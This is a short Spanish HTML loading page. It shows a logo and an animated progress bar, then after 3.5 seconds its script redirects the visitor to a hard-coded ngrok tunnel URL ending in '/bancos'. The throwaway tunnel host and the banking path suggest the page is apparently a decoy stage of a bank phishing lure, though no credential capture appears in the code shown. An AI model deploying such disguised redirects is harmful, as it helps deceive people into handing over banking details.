<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Cargando...</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,600&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg-1: #0c1222;
      --bg-2: #152238;
      --accent: #3dd6c6;
      --accent-soft: rgba(61, 214, 198, 0.25);
      --track: rgba(255, 255, 255, 0.08);
      --text: #e8eef8;
      --muted: rgba(232, 238, 248, 0.55);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      display: grid;
      place-items: center;
      font-family: "DM Sans", sans-serif;
      color: var(--text);
      background:
        radial-gradient(ellipse 80% 60% at 50% 0%, #1a3358 0%, transparent 55%),
        linear-gradient(165deg, var(--bg-1), var(--bg-2));
      overflow: hidden;
    }

    .loader {
      width: min(420px, 88vw);
      text-align: center;
    }

    .logo {
      display: block;
      width: 108px;
      height: 108px;
      margin: 0 auto 1.5rem;
      border: 3px solid rgba(255, 255, 255, 0.24);
      border-radius: 50%;
      object-fit: cover;
      background: #fff;
      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.35);
      animation: float 2.8s ease-in-out infinite, fadeUp 0.7s ease both;
    }

    .loader h1 {
      font-size: clamp(1.1rem, 2.5vw, 1.35rem);
      font-weight: 600;
      letter-spacing: 0.02em;
      margin-bottom: 0.35rem;
      animation: fadeUp 0.7s ease both;
    }

    .loader p {
      color: var(--muted);
      font-size: 0.9rem;
      margin-bottom: 1.75rem;
      animation: fadeUp 0.7s ease 0.1s both;
    }

    .track {
      height: 6px;
      border-radius: 999px;
      background: var(--track);
      overflow: hidden;
      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.35);
      animation: fadeUp 0.7s ease 0.2s both;
    }

    .bar {
      height: 100%;
      width: 0%;
      border-radius: inherit;
      background: linear-gradient(90deg, #2bb8a9, var(--accent), #7ef0e4);
      box-shadow: 0 0 18px var(--accent-soft);
      transition: width 0.08s linear;
    }

    .percent {
      margin-top: 0.85rem;
      font-size: 0.8rem;
      color: var(--muted);
      font-variant-numeric: tabular-nums;
      animation: fadeUp 0.7s ease 0.25s both;
    }

    @keyframes fadeUp {
      from {
        opacity: 0;
        transform: translateY(10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes float {
      0%, 100% {
        transform: translateY(0);
      }
      50% {
        transform: translateY(-12px);
      }
    }
  </style>
</head>
<body>
  <div class="loader">
    <img class="logo" src="logo.png" alt="Logo" />
    <h1>Cargando</h1>
    <p>Espera un momento</p>
    <div class="track" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
      <div class="bar" id="bar"></div>
    </div>
    <div class="percent" id="percent">0%</div>
  </div>

  <script>
    // ========== CAMBIA ESTE ENLACE ==========
    const REDIRECT_URL = "https://cut-sustainer-reassure.ngrok-free.dev/bancos";
    // ========================================

    const DURATION_MS = 3500; // duración de la carga (ms)
    const bar = document.getElementById("bar");
    const percent = document.getElementById("percent");
    const track = document.querySelector(".track");
    const start = performance.now();

    function tick(now) {
      const progress = Math.min((now - start) / DURATION_MS, 1);
      const value = Math.round(progress * 100);

      bar.style.width = value + "%";
      percent.textContent = value + "%";
      track.setAttribute("aria-valuenow", String(value));

      if (progress < 1) {
        requestAnimationFrame(tick);
      } else {
        window.location.href = REDIRECT_URL;
      }
    }

    requestAnimationFrame(tick);
  </script>
</body>
</html>
